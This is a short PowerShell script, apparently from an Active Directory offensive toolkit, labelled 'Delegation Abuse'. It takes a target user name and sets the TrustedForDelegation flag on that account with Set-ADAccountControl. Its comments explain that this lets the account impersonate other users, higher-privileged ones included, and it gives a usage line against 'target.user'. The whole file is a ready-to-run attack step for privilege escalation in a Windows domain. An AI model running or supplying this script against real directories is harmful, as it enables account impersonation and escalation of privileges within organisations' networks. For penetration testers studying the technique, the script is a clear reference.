#############################################
#  ENABLE UNCONSTRAINED DELEGATION          #
#############################################
# Also known as: Delegation Abuse           #
#############################################
# Requires:
# - Permissions to modify the target user's account
# - Domain-joined machine
#
# This allows the user to impersonate other users (including higher-privileged ones)
# after authenticating to a service hosted by this account.
#
# Parameters:
# -UserIdentity : The AD user to modify (e.g., target.user)
#

param(
    [Parameter(Mandatory=$true)]
    [string]$UserIdentity
)


# Ensure the AD module is available
if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    Write-Error "ActiveDirectory module not found. Please install RSAT tools."
    exit
}
Import-Module ActiveDirectory

Set-ADAccountControl -Identity $UserIdentity -TrustedForDelegation $true

# Usage:
# .\enable_unconstrained_delegation.ps1 -UserIdentity "target.user"
